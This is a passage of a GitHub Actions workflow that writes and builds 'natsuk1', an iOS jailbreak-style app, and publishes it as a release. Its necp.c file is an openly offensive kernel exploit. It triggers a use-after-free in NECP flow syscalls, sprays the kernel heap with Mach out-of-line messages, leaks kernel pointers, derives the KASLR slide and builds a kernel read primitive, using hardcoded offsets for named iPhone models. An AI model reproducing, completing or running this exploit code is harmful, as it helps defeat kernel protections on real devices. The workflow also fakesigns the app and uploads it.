      - name: Write SettingsView.swift
        run: |
          cat > natsuk1/Views/SettingsView.swift <<'SWIFT'
          import SwiftUI
          import UIKit

          struct SettingsView: View {
              @EnvironmentObject var state: AppState
              @AppStorage("auto_run") private var auto_run: Bool = false
              @AppStorage("verbose") private var verbose: Bool = true
              @AppStorage("keep_alive_audio") private var keep_alive_audio: Bool = false
              @AppStorage("keep_alive_location") private var keep_alive_location: Bool = false

              private var appName: String {
                  Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String
                      ?? Bundle.main.infoDictionary?["CFBundleName"] as? String ?? "natsuk1"
              }
              private var version: String {
                  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
              }
              private var appIcon: UIImage? {
                  if let icons = Bundle.main.infoDictionary?["CFBundleIcons"] as? [String: Any],
                     let primary = icons["CFBundlePrimaryIcon"] as? [String: Any],
                     let files = primary["CFBundleIconFiles"] as? [String],
                     let last = files.last { return UIImage(named: last) }
                  return UIImage(named: "AppIcon")
              }

              var body: some View {
                  NavigationStack {
                      List {
                          Section {
                              HStack(spacing: 14) {
                                  Group {
                                      if let icon = appIcon {
                                          Image(uiImage: icon).resizable().aspectRatio(contentMode: .fill)
                                      } else {
                                          ZStack {
                                              LinearGradient(colors: [Color.accentColor, Color.accentColor.opacity(0.6)],
                                                             startPoint: .topLeading, endPoint: .bottomTrailing)
                                              Image(systemName: "bolt.fill").font(.system(size: 26, weight: .semibold)).foregroundStyle(.white)
                                          }
                                      }
                                  }
                                  .frame(width: 56, height: 56)
                                  .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
                                  VStack(alignment: .leading, spacing: 2) {
                                      Text(appName).font(.title3).fontWeight(.semibold)
                                      Text("Version \(version)").font(.subheadline).foregroundStyle(.secondary)
                                  }
                              }
                              NavigationLink { AboutView().environmentObject(state) } label: { Text("About") }
                          } header: {
                              Label("App", systemImage: "square.stack.3d.up")
                          }

                          Section {
                              Toggle(isOn: $keep_alive_audio) {
                                  VStack(alignment: .leading, spacing: 2) {
                                      Text("Silent Audio")
                                      Text("Keeps the app running in the background.").font(.caption).foregroundStyle(.secondary)
                                  }
                              }
                              Toggle(isOn: $keep_alive_location) {
                                  VStack(alignment: .leading, spacing: 2) {
                                      Text("Background Location")
                                      Text("Low-accuracy location keeps the app alive.").font(.caption).foregroundStyle(.secondary)
                                  }
                              }
                          } header: {
                              Label("Background Keep-Alive", systemImage: "moon.zzz")
                          }

                          Section {
                              Toggle("Auto Run on Launch", isOn: $auto_run)
                              Toggle("Verbose Output", isOn: $verbose)
                          } header: {
                              Label("Options", systemImage: "switch.2")
                          }
                      }
                      .listStyle(.insetGrouped)
                      .navigationTitle("Settings")
                      .navigationBarTitleDisplayMode(.large)
                  }
              }
          }
          SWIFT

      - name: Write nk_api.h
        run: |
          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
          #ifndef NK_API_H
          #define NK_API_H
          #include <stdint.h>
          #include <stddef.h>
          void nk_set_log(void (*fn)(const char *));
          void nk_logx(const char *tag, const char *fmt, ...);
          void nk_log(const char *fmt, ...);
          void nk_rule(void);
          int nk_run(void);
          int nk_full_exploit(void);
          int nk_necp_run(void);
          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
          #endif
          HEADER

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <pthread.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/vm_map.h>
          #include <mach/vm_region.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN           501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION         502
          #endif

          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
          #define OFF_ALLPROC             0xBBB048ULL
          #define OFF_KERNPROC            0xBBB040ULL
          #define OFF_KERNEL_TASK         0x009C70ULL
          #define OFF_TASK_LIST           0x10D53F0ULL
          #define OFF_KERNEL_MAP          0xBBA228ULL
          #define OFF_ZONE_MAP            0x3D66800ULL
          #define PROC_PID_OFF            0x74
          #define PROC_RO_P_UCRED_OFF     0xB8
          #define TASK_BSD_INFO_OFF       0x3A0
          #define TASK_ITK_SPACE_OFF      0x320
          #define TASK_MAP_OFF            0x28
          #define THREAD_TASK_NEXT_OFF    0x50
          #define UCRED_UID_OFF           0x18
          #define UCRED_SVUID_OFF         0x1C
          #define UCRED_GID_OFF           0x1C
          #define UCRED_SVGID_OFF         0x20
          #define NCF_ASSIGNED_OFF        0x68
          #define NCF_ASSIGNED_LEN_OFF    0x70
          #define NCF_PARENT_OFF          0x88
          #define NCF_REFCNT_OFF          0x58
          #define NCF_STRUCT_SZ           256
          #define NECP_ADD_CLIENT         0x01
          #define NECP_COPY_RESULT        0x04
          #define NECP_ADD_FLOW           0x11
          #define NECP_REMOVE_FLOW        0x12
          #define GATE_BYTE               9
          #define EXHAUST_N               2048
          #define SPRAY_N                 512
          #define DECRETRY_N              24
          #define RESULT_BUF_SZ           8192
          #define KPTR_MIN                0xFFFFFFF000000000ULL
          #define KPTR_MAX                0xFFFFFFFFFF000000ULL

          static uint64_t g_kbase   = 0;
          static uint64_t g_slide   = 0;
          static int      g_res_off = -1;
          static uint8_t  g_res_buf[RESULT_BUF_SZ];

          typedef struct {
              mach_msg_header_t          hdr;
              mach_msg_body_t            body;
              mach_msg_ool_descriptor_t  ool;
          } ool_send_t;

          static void log_info(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "%s", body);
          }
          static void log_ok(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "+ %s", body);
          }
          static void log_err(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "- %s", body);
          }
          static void log_warn(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "! %s", body);
          }

          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
              char line[256];
              int off = 0;
              size_t lim = n < 64 ? n : 64;
              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
              nk_logx(tag, "%s (%zu bytes)", line, n);
          }

          static mach_port_t port_new(void) {
              mach_port_t p = MACH_PORT_NULL;
              kern_return_t kr = mach_port_allocate(mach_task_self(),
                                                    MACH_PORT_RIGHT_RECEIVE, &p);
              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
              return p;
          }

          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
              ool_send_t m;
              for (int i = 0; i < n; i++) {
                  memset(&m, 0, sizeof(m));
                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                                         | MACH_MSGH_BITS_COMPLEX;
                  m.hdr.msgh_size        = sizeof(m);
                  m.hdr.msgh_remote_port = port;
                  m.hdr.msgh_id          = 0x4E41 + i;
                  m.body.msgh_descriptor_count = 1;
                  m.ool.address    = (void*)data;
                  m.ool.size       = (mach_msg_size_t)sz;
                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
                  m.ool.deallocate = FALSE;
                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
              }
          }

          static void ool_drain(mach_port_t port, int n) {
              uint8_t buf[NCF_STRUCT_SZ + 512];
              mach_msg_header_t *h = (mach_msg_header_t*)buf;
              for (int i = 0; i < n; i++) {
                  h->msgh_size = sizeof(buf);
                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
                  if (kr != KERN_SUCCESS) break;
              }
          }

          static int necp_open_fd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
          static int necp_add_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT, uuid, (size_t)16, p, (size_t)1);
          }
          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cuuid, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW, (void*)cuuid, (size_t)16, req, (size_t)56);
              if (r == 0) { memcpy(fuuid, req, 16); fuuid[GATE_BYTE] |= 0x01; }
              return r;
          }
          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW, (void*)fuuid, (size_t)16, NULL, (size_t)0);
          }
          static int necp_copy_result(int fd, const uint8_t cuuid[16], uint8_t *buf, size_t blen) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT, (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
          }

          static uint64_t necp_primary_leak(uint8_t *out, size_t outsz) {
              int fd = necp_open_fd();
              if (fd < 0) { log_err("LEAK", "open errno=%d", errno); return 0; }
              uint8_t cuuid[16], fuuid[16];
              if (necp_add_client(fd, cuuid) != 0) { log_err("LEAK", "add_client errno=%d", errno); close(fd); return 0; }
              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("LEAK", "add_flow errno=%d", errno); close(fd); return 0; }
              necp_remove_flow(fd, fuuid);
              memset(out, 0, outsz);
              int r = necp_copy_result(fd, cuuid, out, outsz);
              close(fd);
              log_info("LEAK", "copy_result ret=%d", r);
              if (r <= 0) return 0;
              dump_hex("LEAK", out, r > 64 ? 64 : (size_t)r);
              int found = 0;
              for (int i = 0; i <= r - 8; i += 8) {
                  uint64_t v; memcpy(&v, out + i, 8);
                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
                  log_ok("LEAK", "kptr[+0x%x] = 0x%llx", i, (unsigned long long)v);
                  found++;
              }
              if (!found) { log_warn("LEAK", "no kernel pointers in %d bytes", r); return 0; }
              return (uint64_t)found;
          }

          static uint64_t slide_from_leak(uint64_t leaked) {
              static const uint64_t known_offs[] = { 0xBBB040, 0xBBB048, 0x009C70, 0x10D53F0, 0xBBA228, 0x3D66800 };
              for (int i = 0; i < 6; i++) {
                  uint64_t sl = leaked - known_offs[i];
                  if (sl & 0x1FFFFF) continue;
                  if (sl >= 0x400000000ULL) continue;
                  uint64_t base = KERNEL_BASE_STATIC + sl;
                  log_info("SLIDE", "cand[%d] off=0x%llx slide=0x%llx base=0x%llx",
                           i, (unsigned long long)known_offs[i],
                           (unsigned long long)sl, (unsigned long long)base);
                  return sl;
              }
              return 0;
          }

          static int kread_raw(uint64_t kaddr, uint32_t len) {
              uint8_t fake[NCF_STRUCT_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
              uint8_t junk[NCF_STRUCT_SZ];
              memset(junk, 0x41, sizeof(junk));
              mach_port_t ex = port_new();
              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
              int fd = necp_open_fd();
              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno); mach_port_destroy(mach_task_self(), ex); return -1; }
              uint8_t cuuid[16], fuuid[16];
              if (necp_add_client(fd, cuuid) != 0) { log_err("KREAD", "add_client errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -2; }
              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("KREAD", "add_flow errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -3; }
              necp_remove_flow(fd, fuuid);
              ool_drain(ex, EXHAUST_N);
              mach_port_destroy(mach_task_self(), ex);
              usleep(150);
              mach_port_t sp = port_new();
              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
              usleep(100);
              memset(g_res_buf, 0, RESULT_BUF_SZ);
              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
              ool_drain(sp, SPRAY_N);
              mach_port_destroy(mach_task_self(), sp);
              close(fd);
              return ret;
          }

          static int calibrate_kread(void) {
              if (g_res_off >= 0) return 0;
              log_info("KREAD", "calibrate with allproc @ kbase+0x%llx", (unsigned long long)OFF_ALLPROC);
              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
              log_info("KREAD", "result buf len=%d", r);
              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
              for (int i = 0; i <= r - 8; i++) {
                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
                      log_ok("KREAD", "found kptr=0x%llx at result[%d]", (unsigned long long)v, i);
                      g_res_off = i;
                      return 0;
                  }
              }
              log_err("KREAD", "no kernel ptr in result");
              return -1;
          }

          static uint64_t kread64(uint64_t addr) {
              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
                  if (calibrate_kread() != 0) return 0;
              }
              int r = kread_raw(addr, 8);
              if (r <= 0) return 0;
              int off = (g_res_off >= 0) ? g_res_off : 0;
              if (off + 8 > r) return 0;
              uint64_t v; memcpy(&v, g_res_buf + off, 8);
              return v;
          }

          static uint32_t kread32(uint64_t addr) { return (uint32_t)(kread64(addr) & 0xFFFFFFFF); }

          typedef struct {
              uint64_t allproc, kernproc, kernel_task, task_list, kernel_map, zone_map;
          } kobj_t;

          static int sanity_check(void) {
              log_info("SANITY", "reading known globals via kread...");
              uint64_t allproc     = kread64(g_kbase + OFF_ALLPROC);
              uint64_t kernproc    = kread64(g_kbase + OFF_KERNPROC);
              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
              uint64_t task_list   = kread64(g_kbase + OFF_TASK_LIST);
              uint64_t kernel_map  = kread64(g_kbase + OFF_KERNEL_MAP);
              uint64_t zone_map    = kread64(g_kbase + OFF_ZONE_MAP);
              log_info("SANITY", "allproc     = 0x%llx", (unsigned long long)allproc);
              log_info("SANITY", "kernproc    = 0x%llx", (unsigned long long)kernproc);
              log_info("SANITY", "kernel_task = 0x%llx", (unsigned long long)kernel_task);
              log_info("SANITY", "task_list   = 0x%llx", (unsigned long long)task_list);
              log_info("SANITY", "kernel_map  = 0x%llx", (unsigned long long)kernel_map);
              log_info("SANITY", "zone_map    = 0x%llx", (unsigned long long)zone_map);
              int ok = 0;
              if (allproc     >= KPTR_MIN && allproc     <= KPTR_MAX) ok++;
              if (kernproc    >= KPTR_MIN && kernproc    <= KPTR_MAX) ok++;
              if (kernel_task >= KPTR_MIN && kernel_task <= KPTR_MAX) ok++;
              if (kernel_map  >= KPTR_MIN && kernel_map  <= KPTR_MAX) ok++;
              log_info("SANITY", "%d/4 globals look valid", ok);
              return ok >= 2 ? 0 : -1;
          }

          static int task_sanity(void) {
              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
              if (!kernel_task) { log_err("TASK", "kernel_task=0"); return -1; }
              uint64_t kproc = kread64(kernel_task + TASK_BSD_INFO_OFF);
              log_info("TASK", "kernel_task->bsd_info=0x%llx", (unsigned long long)kproc);
              if (kproc >= KPTR_MIN && kproc <= KPTR_MAX) {
                  uint32_t pid = kread32(kproc + PROC_PID_OFF);
                  log_info("TASK", "kernel proc pid=%u (expect 0)", pid);
                  if (pid == 0) { log_ok("TASK", "task->bsd_info chain works"); return 0; }
              }
              log_warn("TASK", "chain broken");
              return -1;
          }

          int nk_necp_run(void) {
              nk_log("");
              nk_log("=== natsuk1 v1.1 ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("device: iPhone14,5 / iPhone14,7");
              nk_log("");
              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x", NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
              log_info("P0", "NECP primary leak");
              uint8_t leak[RESULT_BUF_SZ];
              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
              if (!nptrs) { log_err("P0", "no kernel ptrs — NCF_ASSIGNED_OFF likely wrong"); return 1; }
              log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
              log_info("P1", "derive slide from leak");
              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
                  uint64_t v; memcpy(&v, leak + i, 8);
                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
                  uint64_t cand = slide_from_leak(v);
                  if (cand) { g_slide = cand; break; }
              }
              if (!g_slide) { log_err("P1", "no valid slide candidate"); return 1; }
              g_kbase = KERNEL_BASE_STATIC + g_slide;
              log_ok("P1", "slide=0x%llx kbase=0x%llx", (unsigned long long)g_slide, (unsigned long long)g_kbase);
              {
                  int fd = necp_open_fd();
                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
                  close(fd);
                  log_ok("P2", "necp OK");
              }
              log_info("P3", "kread calibration");
              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
              log_info("P4", "sanity: read known globals");
              if (sanity_check() != 0) { log_err("P4", "kread sanity failed"); return 1; }
              log_info("P5", "sanity: task->bsd_info chain");
              if (task_sanity() != 0) { log_warn("P5", "chain broken but continuing"); }
              log_ok("DONE", "leak + slide + kread chain complete");
              nk_log("");
              nk_log("=== RESULT ===");
              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
                      (unsigned long long)KERNEL_BASE_STATIC, (unsigned long long)OFF_ALLPROC);
              nk_log("");
              return 0;
          }
          NECP

      - name: Verify
        run: |
          set -euo pipefail
          grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || { echo "FAIL: necp proto"; exit 1; }
          grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || { echo "FAIL: necp impl"; exit 1; }
          grep -q 'circle.fill' natsuk1/Views/OverviewView.swift || { echo "FAIL: status dot"; exit 1; }
          grep -q 'flame' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools exploit icon"; exit 1; }
          grep -q 'iphone.gen3' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools device icon"; exit 1; }
          grep -q 'waveform.path.ecg.rectangle' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools diag icon"; exit 1; }
          grep -q 'square.stack.3d.up' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings app icon"; exit 1; }
          grep -q 'moon.zzz' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings keepalive icon"; exit 1; }
          grep -q 'switch.2' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings options icon"; exit 1; }
          grep -q 'SWIFT_VERSION: "5.0"' project.yml || { echo "FAIL: swift version"; exit 1; }
          echo "verify OK"

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false --notes "Status dot + icon refresh"

      - name: Commit
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/ .github/ project.yml
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "Status dot + icon refresh [skip ci]"
          git push
